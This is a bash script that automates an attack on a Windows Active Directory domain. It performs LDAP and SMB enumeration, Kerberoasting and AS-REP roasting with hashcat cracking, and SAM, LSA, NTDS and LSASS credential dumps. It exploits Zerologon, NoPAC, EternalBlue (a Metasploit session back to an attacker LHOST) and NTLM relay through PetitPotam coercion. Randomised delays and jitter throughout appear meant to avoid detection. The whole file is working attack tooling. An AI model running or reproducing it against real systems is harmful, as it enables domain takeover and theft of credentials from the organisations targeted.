#!/bin/bash

RED='\e[31m'
GREEN='\e[32m'
ENDCOLOR='\e[0m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
BOLD='\033[1m'

while getopts ":d:i:u:p:" o; do
	case "${o}" in
		d) domain_address=${OPTARG} ;;
		i) ip=${OPTARG} ;;
		u) username=${OPTARG} ;;
		p) password=${OPTARG} ;;
		*) usage; exit 1 ;;
	esac
done
 
if [ -z "${domain_address}" ] || [ -z "${ip}" ] || [ -z "${username}" ] || [ -z "${password}" ]; then
	echo -e "${RED}Error: You entered missing/incomplete parameters!$ENDCOLOR"
	usage
	exit 1
fi

random_delay() {
    # Gaussian-like distribution için 3 random değer ortalaması
    local r1=$((RANDOM % 21 + 10))  # 10-30
    local r2=$((RANDOM % 21 + 10))
    local r3=$((RANDOM % 21 + 10))
    local delay=$(( (r1 + r2 + r3) / 3 ))
    
    # Küçük jitter ekle (-2 ila +2 saniye)
    local jitter=$((RANDOM % 5 - 2))
    delay=$((delay + jitter))
    
    # Sınırları koru
    [ $delay -lt 10 ] && delay=10
    [ $delay -gt 30 ] && delay=30
    
    echo -e "${CYAN}[*] Waiting ${delay}s...${ENDCOLOR}"
    sleep $delay
}


ldap_dump(){
	mkdir -p ./ldap_dump
	echo "===================================="
	echo -e "\nLDAP Enumeration"
	echo "Domain Address: $domain_address"
	echo "IP Address:     $ip"
	echo "Username:       $username"
	echo "===================================="

	dn_base=$(ldapsearch -x -H ldap://$ip -D "$username@$domain_address" -w "$password" -s base | grep "defaultNamingContext:" | cut -d " " -f 2)

	# users info
	random_delay

	ldapsearch -x -H ldap://$ip -D "${username}@${domain_address}" -w "${password}" \
	  -b "${dn_base}" 'objectClass=user' dn sAMAccountName description memberOf servicePrincipalName isCriticalSystemObject -LLL -o ldif-wrap=no \
	  | grep -v "#" | awk '/^dn:/{print "----------------------------------------"} 1' > ./ldap_dump/users.txt

	# groups info
	random_delay

	ldapsearch -x -H ldap://$ip -D "${username}@${domain_address}" -w "${password}" \
	  -b "${dn_base}" 'objectClass=group' dn sAMAccountName description member memberOf servicePrincipalName isCriticalSystemObject -LLL -o ldif-wrap=no \
	  | grep -v "#" | awk '/^dn:/{print "----------------------------------------"} 1' > ./ldap_dump/groups.txt

	# computers info
	random_delay

	ldapsearch -x -H ldap://$ip -D "${username}@${domain_address}" -w "${password}" \
	  -b "${dn_base}" 'objectClass=computer' dn sAMAccountName operatingSystem operatingSystemVersion servicePrincipalName isCriticalSystemObject -LLL -o ldif-wrap=no \
	  | grep -v "#" | awk '/^dn:/{print "----------------------------------------"} 1' > ./ldap_dump/computers.txt

	# Kerberoatable accounts
	random_delay

	ldapsearch -x -H ldap://$ip -D "${username}@${domain_address}" -w "${password}" \
	  -b "${dn_base}" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer))(!(samAccountName=krbtgt)))" dn sAMAccountName servicePrincipalName \
	  -LLL -o ldif-wrap=no | grep -v "#" | awk '/^dn:/{print "----------------------------------------"} 1' > ./ldap_dump/kerberoastable.txt

	# AS-REP Roastable accounts
	random_delay

	ldapsearch -x -H ldap://$ip -D "${username}@${domain_address}" -w "${password}" \
	  -b "${dn_base}" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" dn sAMAccountName description servicePrincipalName isCriticalSystemObject -LLL -o ldif-wrap=no | grep -v "#" \
	  | awk '/^dn:/{print "----------------------------------------"} 1' > ./ldap_dump/aspreproastable.txt

	echo -e "\nSaved Outputs:"
	[ -s "./ldap_dump/users.txt" ] && echo -e "📁 Users: ./ldap_dump/users.txt"
	[ -s "./ldap_dump/groups.txt" ] && echo -e "📁 Groups: ./ldap_dump/groups.txt"
	[ -s "./ldap_dump/computers.txt" ] && echo -e "📁 Computers: ./ldap_dump/computers.txt"
	[ -s "./ldap_dump/kerberoastable.txt" ] && echo -e "📁 Kerberoast: ./ldap_dump/kerberoastable.txt"
	[ -s "./ldap_dump/aspreproastable.txt" ] && echo -e "📁 AS-REP: ./ldap_dump/aspreproastable.txt"
	echo "===================================="
}

kerberos_attck(){
	[ -s "./ldap_dump/kerberoastable.txt" ] && cat ./ldap_dump/kerberoastable.txt | grep sAMA | awk '{print$2}' > ./ldap_dump/kerberoasting_usernames.txt
	[ -s "./ldap_dump/aspreproastable.txt" ] && cat ./ldap_dump/aspreproastable.txt | grep sAMA | awk '{print$2}' > ./ldap_dump/asprep_usernames.txt
	mkdir -p "./kerberos"
	#kerberoasting
	[ -s "./ldap_dump/kerberoasting_usernames.txt" ] && impacket-GetUserSPNs $domain_address/$username:"$password" -dc-ip $ip -request -outputfile ./kerberos/kerberoasting_hashes.txt &> /dev/null
	[ -s "./kerberos/kerberoasting_hashes.txt" ] && echo -e "\nKerberoasting success [$(cat ./kerberos/kerberoasting_hashes.txt | wc -l)] 📁: ./kerberos/kerberoasting_hashes.txt"
	#as-rep roasting
	random_delay
	[ -s "./ldap_dump/asprep_usernames.txt" ] && impacket-GetNPUsers $domain_address/ -usersfile ./ldap_dump/asprep_usernames.txt -dc-ip $ip -no-pass -outputfile ./kerberos/asreproasting_hashes.txt &> /dev/null
	[ -s "./kerberos/asreproasting_hashes.txt" ] && echo -e "AS-REP Roasting success [$(cat ./kerberos/asreproasting_hashes.txt | wc -l)] 📁: ./kerberos/asreproasting_hashes.txt\n"

	if [ ! -s "./kerberos/kerberoasting_hashes.txt" ] && [ ! -s "./kerberos/asreproasting_hashes.txt" ]; then
		echo -e "${RED}[-] No hashes found.${ENDCOLOR}"
		return 0
	fi

	echo -e "\n Do you want to crack hashes (y/n)"
		read -r answer
		[ "$answer" != "y" ] && { echo "[$esc] skipped."; return 0; }
		crack_hashes
}

crack_hashes(){
	echo -e "\nPassword List: "
	read -r wordlist

	if [ ! -s "$wordlist" ]; then
		echo -e "${RED}[!] Wordlist not found or empty: $wordlist${ENDCOLOR}"
		return 1
	fi
	mkdir -p ./hashes
	[ -s ./kerberos/kerberoasting_hashes.txt ] && grep -E '^\$krb5tgs\$23\$' ./kerberos/kerberoasting_hashes.txt > ./hashes/tgs23.hashes
	[ -s ./kerberos/kerberoasting_hashes.txt ] && grep -E '^\$krb5tgs\$17\$' ./kerberos/kerberoasting_hashes.txt > ./hashes/tgs17.hashes
	[ -s ./kerberos/kerberoasting_hashes.txt ] && grep -E '^\$krb5tgs\$18\$' ./kerberos/kerberoasting_hashes.txt > ./hashes/tgs18.hashes

	[ -s ./kerberos/asreproasting_hashes.txt ] && grep -E '^\$krb5asrep\$23\$' ./kerberos/asreproasting_hashes.txt > ./hashes/asrep23.hashes

	find ./hashes/*.hashes -type f -empty -delete

	[ -s ./hashes/tgs23.hashes ] && hashcat -m 13100 -a 0 "./hashes/tgs23.hashes" "$wordlist" --quiet --color-cracked -o ./hashes/tgs23.hashes_cracked
	[ -s ./hashes/tgs17.hashes ] && hashcat -m 19600 -a 0 "./hashes/tgs17.hashes" "$wordlist" --quiet --color-cracked -o ./hashes/tgs17.hashes_cracked
	[ -s ./hashes/tgs18.hashes ] && hashcat -m 19700 -a 0 "./hashes/tgs18.hashes" "$wordlist" --quiet --color-cracked -o ./hashes/tgs18.hashes_cracked
	[ -s ./hashes/asrep23.hashes ] && hashcat -m 18200 -a 0 "./hashes/asrep23.hashes" "$wordlist" --quiet --color-cracked -o ./hashes/asrep23.hashes_cracked

	[ -s ./hashes/tgs23.hashes_cracked ] && echo -e "$GREEN 📁 Result Saved:$ENDCOLOR ./hashes/tgs23.hashes_cracked"
	[ -s ./hashes/tgs17.hashes_cracked ] && echo -e "$GREEN 📁 Result Saved:$ENDCOLOR ./hashes/tgs17.hashes_cracked"
	[ -s ./hashes/tgs18.hashes_cracked ] && echo -e "$GREEN 📁 Result Saved:$ENDCOLOR ./hashes/tgs18.hashes_cracked"
	[ -s ./hashes/asrep23.hashes_cracked ] && echo -e "$GREEN 📁 Result Saved:$ENDCOLOR ./hashes/asrep23.hashes_cracked"
}

smb_enumerate(){

	mkdir -p ./smbdata/
	echo "===================================="
	echo -e "\nSMB Enumeration"
	echo "Domain Address: $domain_address"
	echo "IP Address:     $ip"
	echo "Username:       $username"
	echo "===================================="

	#smb gen relay
	local subnet=$(echo "$ip" | awk -F'.' '{print $1"."$2"."$3".0/24"}')
	echo -e "\nSMB gen relay: $subnet"   # çıktı: 192.168.1.0/24
	nxc smb "$subnet" --gen-relay-list ./smbdata/relaylist.txt

	random_delay
	#interfaces
	echo -e "\nSMB interfaces"
	nxc smb $ip -u "$username" -p "$password" -M enum_interfaces --log ./smbdata/interfaces.txt --jitter 3592

	random_delay
	#smb sessions
	echo -e "\nSMB sessions"
	nxc smb $ip -u "$username" -p "$password" --loggedon-users --reg-sessions --qwinsta --log ./smbdata/smbsessions.txt --jitter 2605

	random_delay
	#smb users & groups
	echo -e "\nSMB users and groups"
	[ ! -s "./ldap_dump/users.txt" ] && nxc smb $ip -u "$username" -p "$password" --rid-brute --log ./smbdata/userandgroups.txt  --jitter 3798
	[ ! -s "./ldap_dump/groups.txt" ] && nxc smb $ip -u "$username" -p "$password" --local-groups --log ./smbdata/userandgroups.txt --jitter 4668
	[ -s "./ldap_dump/users.txt" ] && echo "./ldap_dump/users.txt file found (skipped)"
	[ -s "./ldap_dump/groups.txt" ] && echo "./ldap_dump/groups.txt file found (skipped)"

	random_delay
	#smb password policy
	echo -e "\nSMB password policy"
	nxc smb $ip -u "$username" -p "$password" --pass-pol --log ./smbdata/passpol.txt --jitter 2514

	random_delay
	#smb gpo enumeration
	echo -e "\nSMB GPP Enumeration"
	nxc smb "$ip" -u "$username" -p "$password" -M gpp_autologin -M gpp_password -M gpp_privileges --log ./smbdata/gppout.txt --jitter 1604

	random_delay
	#smb dumping credentials
	echo -e "\nSMB credentials dumping"
	read -p "Dump credentials? (y/N): " confirm
	if [ "$confirm" = "y" ]; then
		nxc smb $ip -u "$username" -p "$password" --sam --log ./smbdata/dump.txt --jitter 1792 # sam database dump edilir.
		nxc smb $ip -u "$username" -p "$password" --lsa --log ./smbdata/dump.txt --jitter 3658 # lsa dump edilir.
		nxc smb $ip -u "$username" -p "$password" --ntds --log ./smbdata/dump.txt --jitter 2735 # ntds dump edilir.
		nxc smb $ip -u "$username" -p "$password" -M lsassy --log ./smbdata/dump.txt --jitter 1537 # lsass dump edilir.
	else
		echo "Skipped."
	fi

	random_delay
	#smb shares
	echo -e "\nSMB shares - (config|ini|xml|txt|pdf|csv|bak|backup|php|cfg|conf|json|js|sql|db|zip|tar|gz)"
	nxc smb "$ip" -u "$username" -p "$password" --shares --jitter 3572 | grep "READ" | awk '{print $5}' | grep -ivE '^(C\$|IPC\$|ADMIN\$|NETLOGON|SYSVOL)[[:space:]]*$' > ./smbdata/sharesname.txt

	[ -s "./smbdata/sharesname.txt" ] && while IFS= read -r share_name; do
		echo "Spidering: $share_name"
		nxc smb "$ip" -u "$username" -p "$password"  --jitter 2578 --spider "$share_name" --content --regex '\.(config|ini|xml|txt|pdf|csv|bak|backup|php|cfg|conf|json|js|sql|db|zip|tar|gz)$'
	done < ./smbdata/sharesname.txt

	random_delay
	#command execute
	echo -e "\nSMB command executing"
	read -p "Execute command (whoami)? (y/N): " confirm
	if [ "$confirm" = "y" ]; then
		nxc smb $ip -u "$username" -p "$password" -x whoami --jitter 2612
	else
		echo "Skipped"
	fi

	read -p "Vulnerability scan?(y/N): " confirm
	if [ "$confirm" = "y" ]; then
		
		random_delay
		#zerologon
		echo -e "\nZerologon checking"
		netbios_name=$(nmblookup -A "$ip" | grep '<00>' | grep -v 'GROUP' | awk '{print $1}' | head -1)
		if [ -z "$netbios_name" ]; then
			netbios_name=$(nxc smb "$ip" --jitter 1496 2>/dev/null | grep -oP '\(name:\K[^)]+')
		fi
		# vuln check
		if timeout 15s python /root/tools/windows/zerologon.py ${netbios_name} "$ip" | tee /dev/tty | grep -q "Success"; then
		    echo -e "\n$GREEN Do you want to exploit zerologon?$ENDCOLOR (y/n)"
		    read -r answer
	    	if [[ "$answer" == "y" ]]; then
			    # exploit
			    random_delay
			    python /root/tools/windows/CVE-2020-1472/cve-2020-1472-exploit.py $netbios_name $ip
			    faketime "$(ntpdate -q "$ip" | cut -d ' ' -f 1-3)" impacket-secretsdump -no-pass "$domain_address/${netbios_name}\$"@"$ip" -outputfile ./secretsdump > /dev/null 2>&1

			    [ -s "./secretsdump.ntds" ] && echo -e "$GREEN Saved secretsdump [$(wc -l < ./secretsdump.ntds)]:$ENDCOLOR ./secretsdump.ntds\n"
			    admin_hash=$(grep -i "^administrator:" ./secretsdump.ntds | cut -d':' -f 3,4 | head -1)
			    faketime "$(ntpdate -q "$ip" | cut -d ' ' -f 1-3)" impacket-secretsdump -hashes "$admin_hash" "administrator@$ip" -outputfile test > /dev/null 2>&1
			    
			    #restore
			    hex_pass=$(grep 'plain_password_hex' ./test.secrets | grep -oP '(?<=plain_password_hex:)[a-f0-9]+' | head -1)

			    [ -z "$hex_pass" ] && {
			        echo -e "${RED}[-] Can not found hex.${ENDCOLOR}"
			        return 1
			    }
			    python /root/tools/windows/CVE-2020-1472/restorepassword.py ${domain_address}/${netbios_name}@${netbios_name} -target-ip $ip -hexpass $hex_pass
			else
				echo "skipped."
			fi
		else
		    echo -e "\n $RED Not vulnerable, skipping. $ENDCOLOR"
		fi


		#NoPAC
		echo -e "\nNoPAC checking"
		random_delay
		if faketime "$(ntpdate -q "$ip" | cut -d ' ' -f 1-3)" nxc smb $ip -u $username -p $password -M nopac | tee /dev/tty | grep -q "VULNERABLE"; then
		    echo -e "\n$GREEN Do you want to exploit nopac?$ENDCOLOR (y/n)"
		    read -r answer
	    	if [[ "$answer" == "y" ]]; then
			    # exploit
			    random_delay
			    read -rp "$(echo -e "\n${GREEN}New Computer Name: ${ENDCOLOR}"): " compname
			    read -rp "$(echo -e "\n${GREEN}Computer Pass: ${ENDCOLOR}"): " comppass
			    impacket-addcomputer -computer-name "${compname}$" -computer-pass "$comppass" -dc-ip $ip ${domain_address}/${username}:${password}

				python /root/tools/impacket/examples/renameMachine.py -current-name "${compname}$" -new-name "${netbios_name}" -dc-ip $ip ${domain_address}/${username}:${password}

				faketime "$(ntpdate -q "$ip" | cut -d ' ' -f 1-3)" impacket-getTGT -dc-ip $ip ${domain_address}/"${netbios_name}":"$comppass"

				python /root/tools/impacket/examples/renameMachine.py -current-name "${netbios_name}" -new-name "${compname}$" -dc-ip $ip ${domain_address}/${username}:${password}

				export KRB5CCNAME=${netbios_name}.ccache
				faketime "$(ntpdate -q "$ip" | cut -d ' ' -f 1-3)" impacket-getST -self -impersonate 'Administrator' -altservice "ldap/${netbios_name}.${domain_address}" -k -no-pass -dc-ip $ip ${domain_address}/"${netbios_name}"

				export KRB5CCNAME=Administrator@ldap_${netbios_name}.${domain_address}@${domain_address^^}.ccache
				faketime "$(ntpdate -q "$ip" | cut -d ' ' -f 1-3)" impacket-secretsdump -k -no-pass -just-dc -dc-ip $ip ${domain_address}/administrator@${netbios_name}.${domain_address} -outputfile nopac > /dev/null 2>&1
				[ -s "./nopac.ntds" ] && echo -e "$GREEN Saved secretsdump[$(wc -l < ./nopac.ntds)]:$ENDCOLOR ./nopac.ntds\n"
			else
				echo "skipped."
			fi
		else
		    echo -e "\n $RED Not vulnerable, skipping. $ENDCOLOR"
		fi


		#ms17-010
		echo -e "\nEternalBlue checking"
		random_delay
		if faketime "$(ntpdate -q "$ip" | cut -d ' ' -f 1-3)" nxc smb $ip -u $username -p $password -M ms17-010 | tee /dev/tty | grep -q "VULNERABLE"; then
		    echo -e "\n$GREEN Do you want to exploit eternalblue?$ENDCOLOR (y/n)"
		    read -r answer
	    	if [[ "$answer" == "y" ]]; then
			    # exploit
			    read -rp "$(echo -e "\n${GREEN}LHOST: ${ENDCOLOR}"): " lhost
			    read -rp "$(echo -e "\n${GREEN}LPORT: ${ENDCOLOR}"): " lport
			    random_delay
			    msfconsole -q -x "use exploit/windows/smb/ms17_010_psexec; set LHOST $lhost; set LPORT $lport; set RHOSTS $ip; run"
			else
				echo "skipped."
			fi
		else
		    echo -e "\n $RED Not vulnerable, skipping. $ENDCOLOR"
		fi
		
		# NTLM Relay
		echo -e "\nNTLM Reflection checking"
		if nxc smb $ip -u $username -p $password | tee /dev/tty | grep -q "signing:False"; then
			random_delay
		    echo -e "\n$GREEN Do you want to exploit NTLM Relay?$ENDCOLOR (y/n)"
		    read -r answer
	    	if [[ "$answer" == "y" ]]; then
			    read -rp "$(echo -e "\n${GREEN}LHOST: ${ENDCOLOR}")" attacker_ip
			    wildcard="localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"
			    relay_log="./ntlmrelay_$ip.txt"

			    impacket-ntlmrelayx -t smb://$ip -smb2support 2>&1 | stdbuf -oL tee "$relay_log" &
			    RELAY_PID=$!
			    sleep 3

			    python3 /root/tools/CVE-2025-33073/dnstool.py \
			        -u "$domain_address\\$username" -p "$password" $ip \
			        -a add -r "$wildcard" -d "$attacker_ip" -dns-ip $ip

			    nxc smb $ip -u $username -p $password \
			        -M coerce_plus -o METHOD=PetitPotam LISTENER=$wildcard

			    elapsed=0
			    until grep -q "Done dumping" "$relay_log" 2>/dev/null; do
			        sleep 1
			        elapsed=$((elapsed + 1))
			        [[ $elapsed -ge 30 ]] && echo -e "\n$RED [-] Timeout, no hashes captured.$ENDCOLOR" && break
			    done
			    kill $RELAY_PID 2>/dev/null
			else
				echo "skipped."
			fi
		else
		    echo -e "\n$RED SMB Signing enabled, skipping.$ENDCOLOR"
		fi
	else
		echo "Skipped."
	fi

}
main(){
	ldap_dump
	smb_enumerate
	echo -e "\n Do you want to attack kerberos (y/n)"
		read -r answer
		[ "$answer" != "y" ] && { echo "[$esc] skipped."; return 0; }
		kerberos_attck

}

main
